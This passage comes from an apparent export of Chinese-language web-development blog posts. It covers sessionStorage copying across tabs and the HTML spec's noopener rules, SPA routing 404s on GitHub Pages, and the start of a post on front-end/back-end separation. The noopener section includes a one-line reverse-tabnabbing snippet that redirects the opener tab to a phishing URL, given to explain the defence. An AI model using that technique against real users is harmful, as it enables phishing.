sessionStorage.getItem('name') console.log('sessionStorage', sessionStorage) console.log('sessionStorage.name', sessionStorage.name) btn.addEventListener('click',() => &#123; sessionStorage.setItem('name', (Math.random()).toString(16)) document.querySelector('b').innerText = sessionStorage.getItem('name') console.log('updated sessionStorage', sessionStorage) console.log('updated sessionStorage.name', sessionStorage.name) &#125;) &lt;/script> &lt;/body> &lt;/html> 如果你點了那個 a 到了新的頁面以後，就會看到 sessionStorage 被複製過來了： 這個新頁面的程式碼如下，裡面沒有一行是在設置 sessionStorage： &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;title>SessionStorage 範例&lt;/title> &lt;meta charset=\"utf-8\"> &lt;/head> &lt;body> &lt;div> 這網站沒有任何設置 sessionStorage 的程式碼&lt;br> 但如果你是從 index.html 的 a 連結點來的，你可以存取得到 &lt;/div> &lt;div> sessionStorage 內容：&lt;b>&lt;/b> &lt;/div> &lt;button id='btn'>重新抓取&lt;/button>&lt;br> &lt;a href=\"index.html\">Back to index.html&lt;/a> &lt;script> document.querySelector('b').innerText = sessionStorage.getItem('name') console.log('sessionStorage', sessionStorage) console.log('sessionStorage.name', sessionStorage.name) btn.addEventListener('click', () => &#123; document.querySelector('b').innerText = sessionStorage.getItem('name') console.log('latest sessionStorage', sessionStorage) console.log('latest sessionStorage.name', sessionStorage.name) &#125;) &lt;/script> &lt;/body> &lt;/html> 因為是新開分頁的關係，所以現在你有兩個分頁，一個是原本的 index.html，另一個是這個新開的 new_tab.html，你可以在 index.html 按下「改變 sessionStorage 內容」，就會看到畫面更新，接著再去 new_tab.html，按下重新抓取，會發現值並沒有改變。 這就是我前面所說的，其實是「複製」，並不是「共用」。因為共用的話一個地方變了，另一個地方會跟著變，但複製的話原本的內容跟複製後的內容，是不會互相干擾的。 當初聽到這個行為之後嚇了一跳，畢竟跟自己認知的不一樣。震驚完之後第一件想到的事情是：「那有辦法可以不要這樣嗎？」，同事有試過幾個方法但是都不行，而我腦中瞬間就聯想到會不會 a 上面有一些屬性可以調整，例如說 noopener, noreferrer 或是 nofollow 之類的，但實際去試以後都沒有效。 後來找了一下資料，終於發現了一個正解，也因為想把相關知識補足，來去看了 sessionStorage 的 spec，發現寫得其實滿不錯的，就想跟大家分享一下。所以呢，接著我們會一起簡單看過 Web storage 的 spec，如果你只是想知道問題的解答，可以直接跳到最後一段。 Web Storage specLocalStorage 跟 sessionStorage 都屬於 Web Storage 的一種，Web Storage 的 spec 在這裡：https://html.spec.whatwg.org/multipage/webstorage.html#introduction-16 我覺得最前面 introduction 那個段落寫得簡單明瞭： This specification introduces two related mechanisms, similar to HTTP session cookies, for storing name-value pairs on the client side 開門見山就跟你說了這兩個東西是在幹嘛，是跟 cookie 類似的兩個機制，拿來在 client side 儲存 name-value pairs 用的。 The first is designed for scenarios where the user is carrying out a single transaction, but could be carrying out multiple transactions in different windows at the same time. 接著則是先講會需要用到 sessionStorage 的情境，這一段要接下面的範例才比較清楚： Cookies don’t really handle this case well. For example, a user could be buying plane tickets in two different windows, using the same site. If the site used cookies to keep track of which ticket the user was buying, then as the user clicked from page to page in both windows, the ticket currently being purchased would “leak” from one window to the other, potentially causing the user to buy two tickets for the same flight without really noticing. 這個例子大概是這樣的，假設現在我們只有 cookie 可以用，然後小明在買機票，因為他想買兩張「不同」的機票，所以他開了兩個分頁。但如果網站沒寫好，是用 cookie 來記錄他要買哪張機票，就有可能發生以下情形： 小明在分頁 A 點了一張台北到日本的機票，網站把這資訊存在 cookie 裡 小明在分頁 B 點了一張台北到紐約的機票，網站把這資訊存在 cookie 裡 由於 cookie 在分頁 AB 是共用的，而且 key 又一樣，所以 cookie 現在存的是台北到紐約的機票 小明在分頁 A 按下結帳，買了台北到紐約的機票 小明在分頁 B 按下結帳，又買了一張台北到紐約的機票 於是小明就買到重複的機票了 這就是把資訊存在 cookie 有可能發生的潛在問題。因此 sessionStorage 就是為了解決這個問題而生，可以把資訊侷限在「一個 session」，以瀏覽器的角度來說基本上就是一個分頁，不會干擾到其他分頁。 再往下看，會講到 localStorage 的使用情境： The second storage mechanism is designed for storage that spans multiple windows, and lasts beyond the current session. In particular, web applications might wish to store megabytes of user data, such as entire user-authored documents or a user’s mailbox, on the client side for performance reasons. Again, cookies do not handle this case well, because they are transmitted with every request. 有些網站可能會因為效能相關的原因，想要在瀏覽器存大量的資料，例如說把使用者的信件都存進去之類的，其實就有點像是自己做 cache，把這些東西存起來，就可以優先從快取去拿，加快載入速度。 但 cookie 不適合這種情境，因為 cookie 會隨著 request 發出去。你想想看，如果你在 cookie 存了 1MB 的資料，這網站底下每個 request 就至少都是 1MB 的大小了，而且那些又是 server 用不到的資料，會造成很多不必要的流量。 因此，localStorage 就這樣誕生了，可以讓你存大量的資料，而且不會被帶去 server。 接著下面還有一段紅字的警告： The localStorage getter provides access to shared state. This specification does not define the interaction with other browsing contexts in a multiprocess user agent, and authors are encouraged to assume that there is no locking mechanism. A site could, for instance, try to read the value of a key, increment its value, then write it back out, using the new value as a unique identifier for the session; if the site does this twice in two different browser windows at the same time, it might end up using the same “unique” identifier for both sessions, with potentially disastrous effects. 大意就是說因為 localStorage 是可以跨頁面被分享的，所以就跟其他那種被共享的資源一樣，要注意 race condition，舉例來說如果有個網站會去 localStorage 讀一個叫做 id 的 key，取出來之後 +1 放回去，把 id 當作頁面的唯一 id，若是兩個頁面同時做這件事，有可能會得到同樣的 id，例如說： 頁面 A 取得 id，id 是 1 頁面 A 把 id + 1 與此同時，頁面 B 也取得 id，也拿到 1 頁面 A 把 id 寫回去，現在 id 是 2 頁面 B 把 id + 1 寫回去，id 還是 2 連續的動作不保證不被其他的 process 給中斷，所以才會寫說：「authors are encouraged to assume that there is no locking mechanism」，要小心這種狀況出現。 再來可以看到 Web Stroage 的 interface： 這邊值得注意的是雖然常見用法是 storage.setItem 或是 storage.getItem，但其實直接 storage[key] = value 以及 storage[key] 也都行得通，刪除的話直接 delete storage[key] 也可以。 然後如果寫不進去的話，會丟一個 QuotaExceededError 出來。 再來還有一段很常出現： Dispatches a storage event on Window objects holding an equivalent Storage object. 這是因為在 storage 裡的內容有變動時，其實都會發出一個事件，而你可以去監聽這個事件做出反應。舉例來說，你可以用這招在不同分頁去偵測 localStorage 的變化並且即時反應，相關說明請看：Window: storage event。 順帶一提，storage 的 key 可以是 emoji，所以打開這個網頁之後，可以看到： 再來底下的 spec 都是在描述各個方法的細節，我這邊就不再重複了。接著一直往下看到 sessionStorage 的部分，會看到這一段： 有看到重點了嗎？ While creating a new auxiliary browsing context, the session storage is copied over. 當建立一個 auxiliary browsing context 的時候，sessionStorage 就會被複製過去。從文章開頭給的那個範例看來，我們可以猜測我們點了 a 標籤新開一個分頁的行為，可能就是「creating a auxiliary browsing context」。 接著我們點進去，看看 creating a auxiliary browsing context 的流程是什麼： 重點是第六步，有提到了會把 sessionStorage 複製過去。 所以呢，現在問題就被重新定義了。 原本我們好奇的是「sessionStorage 什麼時候會被複製」，得到的答案是：「建立 auxiliary browsing context 的時候」，因此現在好奇的問題轉成：「什麼時候會建立 auxiliary browsing context？」 再者，從結果看來，開頭的範例中是透過 a link 外連一個網站達成的，因此可以猜測答案可能就在 link 的 spec 當中。 Links specLinks 相關的 spec 在這裡：https://html.spec.whatwg.org/multipage/links.html 先來看一下 link 的定義： Links are a conceptual construct, created by a, area, form, and link elements, that represent a connection between two resources, one of which is the current Document. There are two kinds of links in HTML: 有四種 elements 可以 create link：&lt;a&gt;、&lt;area&gt;、&lt;form&gt;還有&lt;link&gt;，其中&lt;area&gt;這個我還是第一次聽到。 接著文件中定義了連結有兩種，第一種是：Links to external resources These are links to resources that are to be used to augment the current document, generally automatically processed by the user agent. All external resource links have a fetch and process the linked resource algorithm which describes how the resource is obtained. 可以先簡單想成就是你用 &lt;link&gt; 這個 element 時會用的東西，例如說 CSS 就是一種 external resources，再來第二種是 Hyperlinks： These are links to other resources that are generally exposed to the user by the user agent so that the user can cause the user agent to navigate to those resources, e.g. to visit them in a browser or download them. 就是我們所熟知的超連結，指引瀏覽器（user agent）前往其他資源。 再來我們持續往下看，可以看到 4.6.4 Following hyperlinks 有提到說當使用者按下超連結以後，瀏覽器應該要做什麼： 重點是第六步跟第七步： 6.Let noopener be the result of getting an element’s noopener with subject and targetAttributeValue. 7.Let target and windowType be the result of applying the rules for choosing a browsing context given targetAttributeValue, source, and noopener. 這邊會透過在 spec 上面的流程決定 noopener 的值： 我們一開始的範例符合第二種情況，沒有 opener 屬性，而且 target 是 _blank，所以 noopener 會是 true。 再來我們看第七步，他有一個 the rules for choosing a browsing context 可以點，點下去之後就又回到了 browsing context 的 spec。 在選擇 browsering context 的時候會有一些流程，去判斷應該要選擇哪一個。我們想要找的情況（name 是 _blank）都不符合前面的狀況，所以會直接到第八步： Otherwise, a new browsing context is being requested, and what happens depends on the user agent’s configuration and abilities — it is determined by the rules given for the first applicable option from the following list: 接著下面又有幾條規則，來決定最後應該要做出怎樣的行為，而我們的範例會是這一條規則： 從流程中可以看出來，在第三個步驟中判斷 noopener 是不是 true，是的話就建立一個新的 top-level browsing context，不是的話就建一個 auxiliary browsing context。 這樣看下來，整個流程都清楚了，只要我們進到這邊而且 noopener 是 false，就會建立一個 auxiliary browsing context，進而把 sessionStorage 複製過去。 等等…可是我們的 noopener 不是 true 嗎？在上面決定 noopener 的值的時候，根據我們的狀況，spec 很明顯是 true，那就應該會建立一個新的 top-level browsing context，sessionStorage 也不會被複製過去。 難道我看漏了什麼？ 第一次被 spec 搞混就上手原本自信滿滿想寫這篇文章，結果寫一寫的時候就發現到上面的狀況：「咦，怎麼實際的行為跟 spec 對不起來？」，一直覺得自己看漏了什麼，就又再檢查了幾遍，發現沒錯啊，noopener 的確是 true 才對，那應該就不會建立 auxiliary browsing context 了，sessionStorage 也不應該被複製。 可是在 Chrome 上觀察到的就不是這樣，於是我突然想到了一個可能性，那就是 Chrome 沒有照著 spec 做。這邊要特別留意一件事，那就是我們看的 spec 是最新的 spec，但通常瀏覽器都不會跟到這麼新，再加上有些東西可能是 breaking changes，就會更緩慢一點。 因此我猜測是 spec 有改過，Chrome 所遵照的是以前的行為。有了這個猜測之後，就去搜相關的字眼，真的讓我找到了一個 commit：Make target&#x3D;_blank imply noopener; support opener。 這是 2019 年 2 月 7 號的一個 commit，在 diff 中可以看到這段改動： 在舊的 spec 中，如果 noopener 或是 noreferrer 屬性是 true 才會讓 noopener 是 true，否則就都是 false。 所以我們開頭觀測到的行為是符合舊的 spec 的，我們用 a 連結新開了一個分頁，沒有設置 noopener 跟 noreferrer，所以新開的分頁建立了一個 auxiliary browsing context，sessionStorage 就跟著被複製過去了。 寫到這邊，我們終於得到了一個合理而且權威的解釋，再來只剩下最後幾個問題要處理了： noopener 跟 noreferrer 是什麼？為什麼 spec 要做這個改動？ noopener 與 noreferrer我最早看到這兩個屬性是在 2016 年 5 月，沒記錯的話應該是從這篇臉書貼文中看到的，那時候我好像還有跟同事分享這個東西，因為覺得這招滿帥的。 想知道問題是什麼，可以直接看這篇文章：About rel&#x3D;noopener, what problems does it solve?。 簡單來說呢，當你從網站 A 使用 &lt;a target=&quot;_blank&quot;&gt; 連結到網站 B 的時候，網站 B 可以拿到 window.opener，這就等於是網站 A 的 window，因此我只要在網站 B 執行 window.opener.location = &#39;phishing_site_url&#39;，就可以把網站 A 導到其他地方，如果導去的地方是刻意設置的釣魚網站，那使用者就很有可能中招，因為他根本沒有預期到點了連結之後，網站 A 會跳去其他地方。 而解法呢，就是加上 rel=&quot;noopener&quot; 這個屬性。 另外一個屬性 noreferrer 則是跟 Referer 這個 HTTP request header 有關，例如說我從網站 A 連到網站 B，網站 B 的 Referer 就會是網站的 A 的 URL，所以它會知道你從哪邊來的。 而帶上了這個屬性就是告訴瀏覽器說：「不要幫我帶 Referer 這個 header」。 接著我們回到 spec，看一下 spec 怎麼說。 4.6.6.13 Link type “noopener”： The keyword indicates that any newly created top-level browsing context which results from following the hyperlink will not be an auxiliary browsing context. E.g., its window.opener attribute will be null. 4.6.6.14 Link type “noreferrer”： It indicates that no referrer information is to be leaked when following the link and also implies the noopener keyword behavior under the same conditions. 這邊的定義是「no referrer information is to be leaked」，而這個 referrer information 除了我上面講的 Referer header 之外，其實也包含了其他相關的資訊，不過實際上到底還有什麼，就要去看其他 spec 或是瀏覽器的相關實作了。 然後還有一點要注意的是：「also implies the noopener keyword」，所以用了 noreferrer 之後就蘊含著 noopener 的效果了。 有在寫 React 並且使用 eslint 的朋友們應該都看過一條規則，那就是在用 a link 而且 target 是 _blank 的時候，必須要搭配使用 rel=&quot;noreferrer noopener&quot;，這個規則其實已經被改掉了，現在只要求放上 noreferrer 就好，原因就是我上面講的。 想看更多細節可以看這個 issue：target&#x3D;_blank rel&#x3D;noreferrer implies noopener，原本怕一些舊的 browser 會出問題所以沒有要改，後來是有人提供了一堆瀏覽器的測試資料，確認沒問題之後才改的。 讓我們把主題再拉回 opener 這個問題，當初這個問題被揭露之後我記得受到滿大的關注，在 spec 的 repo 上也可以找到一大堆相關的討論，其實很多人都滿驚訝原來預設的行為是這樣。 相關的討論可以看這一串：Windows opened via a target&#x3D;_blank should not have an opener by default 還有這個 PR：Make target&#x3D;_blank imply noopener; support opener。 總之呢，後來 Safari 跟 Firefox 都針對這點做出改動，使用 target=_blank，預設的 opener 就會是 noopener。 那 Chrome 呢？抱歉，還沒。可以參考：Issue 898942: Anchor target&#x3D;_blank should imply rel&#x3D;noopener。 回到 sessionStorage繞了一大圈，看了一大堆 spec 跟 bug tracker 之後，最後我們回到一開始的主題：sessionStorage。 在 spec 裡面說了，如果建立的是 auxiliary browsing context 就會把 sessionSotrage 複製過去。而如果我們加上了 rel=&quot;noopener&quot;，就不會有這個行為。 所以這就是開頭問題的正解：「加上 rel=&quot;noopener&quot;」。 可是我開頭已經講過了，我試過這些都沒有用，這是為什麼呢？這是因為 Chrome 還沒支援這個行為：Issue 771959: Do not copy sessionStorage when a window is created with noopener，而 Safari 雖然說 target=_blank 會蘊含 rel=&quot;noopener&quot;，但是也沒有支援 noopener 不會複製 sessionStorage。 唯一符合最新標準的是 Firefox，你加上 rel=&quot;noopener&quot;，就真的不會把 sessionStorage 一起帶過去了。 由於這些都是瀏覽器還沒修正的行為，所以我們在開發的時候也無能為力。就現階段來說，在 Chrome 跟 Safari 上面，用 &lt;a target=&quot;_blank&quot;&gt; 開啟同個 origin 下的新分頁，就是會把 sessionStorage 複製一份過去。 再提醒最後一個小細節，「點擊連結」跟「右鍵 -&gt; 開新分頁」的行為是不同的。前者會把 sessionStorage 複製過去，但後者不會。因為瀏覽器（至少是 Chrome 跟 Safari）認為「右鍵 -&gt; 開新分頁」就像是你新開一個 tab，然後把網址複製貼上，而不是直接從現有的分頁連過去，所以不會幫你複製 sessionStorage。 再次附上開頭的 demo，你自己試試看就知道了：https://aszx87410.github.io/demo/session_storage/index.html 相關討論可以看：Issue 165452: sessionStorage variables not being copied to new tab。 結語以 sessionStorage 為起點向外延伸，我們探索到了很多新的東西，而且連結到了我幾年前看到的 noopener 安全性的文章，也連結到了之前寫 code 時碰到的 eslint warning，如果還想再繼續連結，甚至也可以連到 Chrome 最近對 Referer 做出的改動。所以儘管只是一個看起來很小的知識點，背後都蘊含著一整張超大的知識圖譜。 在發現 spec 跟實作不一樣的時候，我瞬間體會到了「盡信書不如無書」的感覺，我原本一直都以為 spec 就是唯一的權威，卻忽略了 spec 會不斷變動、更新，但實作不一定會跟上的這個事實。還有一點，那就是瀏覽器的實作有時候會因為一些考量，不會完全跟著 spec 走，這一點也是往後需要特別注意的。 經歷過這麼一段旅程之後，對 sessionStorage 的理解又更深入了一些。以後有機會的話把 HTML 的 spec 都翻一翻好了，應該能看到更多有趣的東西。 參考資料： HTML spec About rel&#x3D;noopener, what problems does it solve? target&#x3D;_blank rel&#x3D;noreferrer implies noopener Windows opened via a target&#x3D;_blank should not have an opener by default Issue 898942: Anchor target&#x3D;_blank should imply rel&#x3D;noopener Issue 771959: Do not copy sessionStorage when a window is created with noopener Issue 165452: sessionStorage variables not being copied to new tab","link":"/2020/09/05/session-storage-and-html-spec-and-noopener/"},{"title":"淺談新手在學習 SPA 時的常見問題：以 Router 為例","text":"簡介近幾年前端框架大放異彩，許多新手才學沒多久的 JavaScript，就直接學習三大框架了（雖然 React 不是框架，但整個生態系其實就跟框架沒兩樣，因此我覺得歸類在框架也不是不行）。 而這三大框架通常都是拿來寫 SPA（Single Page Application）用的，我一直認為在學習這些框架前應該要具備一些基礎知識，尤其是對於前後端的理解，否則一定會遇到很多不知道從何解起的問題。 因此，本文舉出一個我自己曾經碰過，學生也常常跑來問我的問題當作範例，大家也可以先想一下自己能不能回答出這個問題： 假設今天我有個 SPA，搭配某些 router 的 library 來實作路由，所以 /list 會連到列表頁，/about 會到關於我的頁面。 可是奇怪了，當我把 SPA 上傳到 GitHub Pages 之後，首頁是好的，我從首頁進去 /list 也是好的，可是當我在 /list 重新整理的時候，卻顯示 404 not found，這是為什麼呢？ 要回答這個問題，必須先來複習一下前後端相關的網路基礎知識。 動態網頁與靜態網頁先想一下，你認知中的動態網頁與靜態網頁是什麼？它們的區別又在哪裡？ 當我們在講到動態與靜態時，其實所談到的東西並不是「網頁上的內容」會不會變。而是指「我所請求的網頁是否有被 Server 『處理』過」。這樣定義可能不太精確，但我接下來舉幾個例子你就會懂了。 先舉個最簡單的例子，假設現在有個檔案叫做 a.php，程式碼長這樣： &lt;?php echo \"hello!\"; ?> 今天如果我造訪 a.php，看到的內容就是： &lt;?php echo &quot;hello!&quot;; ?&gt; 就代表什麼？代表這是個「靜態網頁」，Server 並沒有透過 PHP 相關的程式去處理這隻檔案，而是把這個 a.php 當作「檔案」給傳回來，就是一般俗稱的 static file。 若是我們今天看到的內容是： hello! 就代表 Server 把這個 a.php 給執行了，並且把輸出的結果當作 Response 回傳，這樣的網頁就叫做「動態網頁」，雖然內容沒有變，但它確實是動態網頁。 這就是動態跟靜態的區別，事實上跟你看到的內容會不會改變一點關係都沒有。靜態的會把請求的資源直接當作檔案回傳，動態的則是會在 Server 處理過後才把結果當成 Response 回傳。 為了確保你有完全理解這個概念，我們來看底下這個範例，index.html： &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;meta charset=\"UTF-8\"> &lt;/head> &lt;body> &lt;/body> &lt;script> document.writeln(new Date()) &lt;/script> &lt;/html> 請問這是一個動態還是靜態網頁？ 答案是靜態。因為這就是一個靜態的 HTML 檔案，沒有被 Server 特殊處理就直接傳到 Client 端，Client 端看到的就是存放在 Server 的檔案內容。雖然畫面上的資訊會改變沒錯，但我前面說過了，這並不是區分動態或靜態的標準。 談完了動態與靜態之後，我們來談談 Server 處理請求的方式。 Server 與路徑最常看到的一種網址是什麼？是像檔案那樣子的，例如說 GitHub Pages：http://aszx87410.github.io/mars-lang-chrome-extension/index.html，後半段的 mars-lang-chrome-extension/index.html 就代表在 mars-lang-chrome-extension 這個資料夾底下有 index.html 這個檔案。 這邊的網址某種程度上就反映了真實的檔案路徑，所以存取任何一個頁面就跟存取檔案差不多。但這些其實都是可以透過 Server 更改設定的！ 意思是說，如果我想要的話，我可以讓 https://huli.tw/123 輸出我 Server 上面位於 /data/test.html 的這個檔案，這些都是可以調整的。 所以網址跟真實的檔案路徑可以類似，也可以完全不同，這些都可以在 Server 調整。一般來說最常見的跟檔案相關的 Server 其實有兩種。 第一種就是「完全靜態」的 static file server，指的就是無論任何檔案都不會經過處理，然後會對應到檔案路徑，是什麼檔案就輸出什麼內容。 最經典的範例就是 GitHub Pages，無論你放 PHP、Ruby 還是 JavaScript，它都只會把「檔案內容」一五一十的輸出給你，而不會去執行那個腳本。所以你沒辦法在 GitHub Pages 上面跑任何跟 Server 有關的東西，你沒辦法跑 PHP，沒辦法跑 Rails 也沒辦法跑 Express，因為它不會幫你做任何處理，只會把檔案內容回傳。 第二種則是經典的 Apache Server，通常都是搭配 PHP 來做使用，它會幫你把 PHP 檔案執行過後才把結果回傳；PHP 以外的檔案則是當作靜態檔案，就跟 GitHub Pages 一樣。 回到我們開頭的例子，如果你有個檔案叫做 a.php，內容是： &lt;?php echo \"hello!\"; ?> 若是你把這個檔案放上去 GitHub Pages，你只會看到上面那樣的內容，因為它就只是個檔案。 但如果你把這檔案放到設置好 Apache + PHP 的 Server，你會看到 hello!，因為 Server 先執行過這個 PHP 才把結果輸出。 好，有了這些基礎之後，我們自然可以來解決第一個問題。 假設今天我有個 SPA，搭配某些 router 的 library 來實作路由，所以 /list 會連到列表頁，/about 會到關於我的頁面。 可是奇怪了，當我把 SPA 上傳到 GitHub Pages 之後，首頁是好的，我從首頁進去 /list 也是好的，可是當我在 /list 重新整理的時候，卻顯示 404 not found，這是為什麼呢？ 前面有提到過 GitHub Pages 是完全靜態的 Server，而且網址對應到了真實的檔案路徑，所以當你存取根目錄 / 時，預設的設定本來就會去找 /index.html，因此可以正常存取檔案。 但是當你造訪 /list 時，你的 GitHub 上又沒有 /list/index.html，所以當然顯示 404 not found 了，不是很合理嗎？ 這時候你一定會問： 那為什麼我從首頁進去再進到列表頁就沒問題？ 要回答這個問題，就要來看 SPA 的路由到底是怎麼實現的了。 SPA 的 router 實現還記得 SPA 的定義嗎？Single Page，就代表它永不換頁，永遠都在同一頁上面。 可是如果不能換頁，那網址不就是同一個了嗎？這樣不是很不方便嗎？我只要重新整理，就會回到最初的起點，呆呆地站在鏡子前，又回到了同一個頁面。 那有沒有看起來很像換頁，但又不會真的換頁的方法？ 有！那就是在網址後面加個 #，然後去改變後面的東西！ 舉例來說，原本是 index.html，切換到列表頁就變成 index.html#list，關於我頁面就是 index.html#about，這樣不就好了嗎！ 結果長這樣： 範例在這邊，底下是完整程式碼： &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;meta charset=\"UTF-8\"> &lt;style> .page &#123; display: none; &#125; &lt;/style> &lt;/head> &lt;body> &lt;nav> &lt;a href=\"#home\">home&lt;/a> | &lt;a href=\"#list\">list&lt;/a> | &lt;a href=\"#about\">about&lt;/a> &lt;/nav> &lt;div class=\"page home-page\">I am homepage&lt;/div> &lt;div class=\"page list-page\">I am list&lt;/div> &lt;div class=\"page about-page\">About me &lt;/div> &lt;/body> &lt;script src=\"https://code.jquery.com/jquery-1.12.4.min.js\">&lt;/script> &lt;script> function changePage(hash) &#123; $('.page').hide() if (hash === '#home') &#123; $('.home-page').show() &#125; else if (hash === '#list') &#123; $('.list-page').show() &#125; else if (hash === '#about') &#123; $('.about-page').show() &#125; &#125; // 初始化 changePage(location.hash) // 每當 hash 變動的時候 window.addEventListener(\"hashchange\", function() &#123; changePage(location.hash) &#125;); &lt;/script> &lt;/html> 利用網址後面加上 # 不會跳頁的方式來辨別現在在哪裡，這就是 react-router 裡面提到的 hashRouter。 可是這樣子網址會變得很醜，而且跟其他人的網址都不一樣，會有 hashtag 出現。有沒有什麼辦法讓 hashtag 不見呢？ 有！那就是利用 HTML5 提供的 History API，就可以用 JavaScript 來操作網址列，但又不會真的換頁了。 在 MDN 下方「pushState() 方法範例」的段落是這樣寫的： 假設 http://mozilla.org/foo.html 執行了下面的 JavaScript： var stateObj &#x3D; { foo: “bar” };history.pushState(stateObj, “page 2”, “bar.html”); 這會讓網址列顯示 http://mozilla.org/bar.html，但不會讓瀏覽器去載入 bar.html，甚或去檢查 bar.html 存在與否。 重點來了，就是這一句：「但不會讓瀏覽器去載入 bar.html」，就算網址列有變，只要瀏覽器沒有去載入其他頁面，其實就不叫「換頁」。所以 SPA 從來都不是指說「網址列不能變」，而是不能去載入其他頁面，這點一定要搞清楚。 範例如下： 完整程式碼在這邊： &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;meta charset=\"UTF-8\"> &lt;style> .page &#123; display: none; &#125; .home-page &#123; display: block; &#125; &lt;/style> &lt;/head> &lt;body> &lt;nav> &lt;span onclick=\"changePage('home')\">home&lt;/span> | &lt;span onclick=\"changePage('list')\">list&lt;/span> | &lt;span onclick=\"changePage('about')\">about&lt;/span> &lt;/nav> &lt;div class=\"page home-page\">I am homepage&lt;/div> &lt;div class=\"page list-page\">I am list&lt;/div> &lt;div class=\"page about-page\">About me &lt;/div> &lt;/body> &lt;script src=\"https://code.jquery.com/jquery-1.12.4.min.js\">&lt;/script> &lt;script> function changePage(page) &#123; $('.page').hide() if (page === 'home') &#123; $('.home-page').show() &#125; else if (page === 'list') &#123; $('.list-page').show() &#125; else if (page === 'about') &#123; $('.about-page').show() &#125; // 精華所在 history.pushState(null, null, page) &#125; &lt;/script> &lt;/html> 在換頁的時候利用 pushState 去改變網址，於是網址就變了，但卻不會真的去載入那個新的頁面，根本就是完美！ 補齊了這些知識之後，我們終於可以來回答第一個問題了。當我們在實作 SPA 時，在前端的換頁使用了 pushState，讓我們利用 JavaScript 來更新網址列卻不會真的載入那個資源。 可是如果我們重新整理呢？那意思就變成是要直接去載入那個資源啊！然後伺服器又沒有那個檔案，所以當然會回傳 404 not found。之所以從首頁進去會可以，是因為從首頁到列表頁，我們只是用 pushState 去改變網址，從 / 改成 /list。 但如果我們直接在 /list 重新整理，就代表瀏覽器會發送 Request 去 /list 要資料，自然就會回傳 404 not found。 那要怎麼解決這個問題呢？在 GitHub Pages 上面可以設定一個自訂的 404 page，你可以把這個 404 page 就設置成是你的 index.html，這樣無論網址是什麼，都會回傳 index.html。 我這邊上傳了一個小小的 demo，程式碼在這邊：https://github.com/aszx87410/spa-problem-demo，其實就是直接把 index.html 的內容複製到 404.html 去而已。 或是也可以參考這個：rafrex&#x2F;spa-github-pages，採用了不同的方法。 如果是用 nginx 的話，只要讓所有路徑都試試看 index.html 就好： location &#x2F; &#123; try_files $uri &#x2F;index.html; &#125; Apache 可以參考網路上找到的設定：SPA - Apache, Nginx Configuration for Single Page Application like React.js on a custom path，原理也是把所有路徑都導到 index.html 去。 總結我自己一開始在接觸這個部分時也是一頭霧水，花了滿多時間去理解到底前後端的 Router 差別在哪裡，發現需要具備一些基礎知識才有辦法解決這個問題。如果你不知道前端 Router 背後是用 History API 實現，自然就會覺得莫名其妙。 而且初學者來說，所有的問題都打結糾纏在一起，很難一條一條去拆開，自然就找不到問題的解答。 希望這一篇能對初學者有些幫助，能確切理解前端 SPA 指的「不換頁」到底是什麼意思，以及背後是透過什麼原理而實現的。","link":"/2019/09/18/spa-common-problem-about-router/"},{"title":"前後端分離與 SPA","text":"前言這篇的原文（你走你的陽關道，我走我的獨木橋：前後端分離）是我之前在 iT 邦幫忙鐵人賽的其中一篇文章，寫完之後有陸陸續續收到一些回饋，就想說可以重新整理一下這篇文章，讓它變得再更清楚一點。 如果你有以下疑惑的話，這篇文章非常適合你： 為什麼前端會有 MVC？ 前端 MVC 跟後端 MVC 有什麼不一樣？ 為什麼要有 SPA（Single Page Application）？ （其實關於 MVC 到底是什麼就有很多討論了，但因為這篇文章的重點不在於此，所以對這方面就不多加描述，有興趣的朋友們可參考：MVC是一個巨大誤會） 先從你熟悉的流程開始如果你要寫一個簡易的部落格，你會怎麼做？ 這答案很簡單嘛，可以先挑一個喜歡的框架，例如說 Rails、Laravel 等等，然後先定義好幾個 URL，再把 DB 的 Schema 想好，最後開始動手 coding。 例如說首頁的部分就是去 DB 把所有文章都撈回來，然後把資料丟到 view 裡面去 render，搞定！ 總而言之，流程大概是這樣： 當你想要訪問文章列表這個頁面的時候，瀏覽器會送 request 到 server，然後經過 controller 與 model，最後把資料帶給 view。 view 再回傳一份完整的 HTML 檔案（這個動作就叫做 render），而瀏覽器拿到之後，只要顯示出來就好。因為 render 在 server side，所以這也叫做 server side render。 這個流程照理來說，應該會是你最熟悉的流程，因為一大堆網頁都是這個樣子做的。 在這個狀況底下，一個只負責前端的工程師，基本上就是負責 view 這個資料夾底下的所有東西，必須用框架提供的 template 把資料跟 HTML 整合在一起。而當他需要 debug 的時候，必須要把整個專案都跑起來，才能看到畫面輸出的結果。 這樣的工作流程讓前後端切得沒有那麼開，畢竟前端工程師還需要會跑 rails，需要設定 DB，搞不好還要會設定 nginx！ 現在的方法雖然把資料（Model）跟顯示（View）切開了，但都還是在後端，有沒有更好的方法呢？有沒有辦法，讓後端專注在提供資料，前端專注在顯示資料呢？ 有！ client side render剛剛我們提到了 server side render，由後端直接回傳整份 HTML，瀏覽器直接顯示就好，因為 response 就是完整的網頁了。 但既然會特別區分 server 跟 client，就代表還有一種方式叫做 client side render，這又是什麼呢？ 大家都知道，JavaScript 可以動態的產生內容，而 client side render 指的就是當前端拿到資料以後，才用 JavaScript 動態的把那些內容填到網頁上面。 直接拿程式碼出來說明，大家會比較好理解一點。 首先，我們的 server 現在就只專注在提供資料，所以就開一個 API 出來： // 首頁，直接輸出所有留言 app.get('/', function (req, res) &#123; // 從資料庫拿出所有的留言 db.getPosts(function (err, posts) &#123; if (err) &#123; res.send(err); &#125; else &#123; // 直接把所有 posts 丟出去 res.send(&#123; posts: posts &#125;); &#125; &#125;) &#125;); 如果用瀏覽器打開這個 API 的網址，應該會看到 JSON 格式的資料： &#123; \"posts\": [ &#123; \"_id\": \"585f662a77467405888b3bbe\", \"author\": \"huli\", \"content\": \"2222\", \"createTime\": \"2016-12-25T06:24:42.990Z\" &#125;, &#123; \"_id\": \"585f662777467405888b3bbd\", \"author\": \"huli\", \"content\": \"1111\", \"createTime\": \"2016-12-25T06:24:39.601Z\" &#125; ] &#125; 後端的部分已經準備就緒，順利地提供資料了，再來我們來看前端，只需要一個index.html就可以了。 &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;link rel=\"stylesheet\" href=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css\" /> &lt;script src=\"https://code.jquery.com/jquery-1.12.4.min.js\">&lt;/script> &lt;script> $(document).ready(function() &#123; getPosts(); &#125;) // ajax 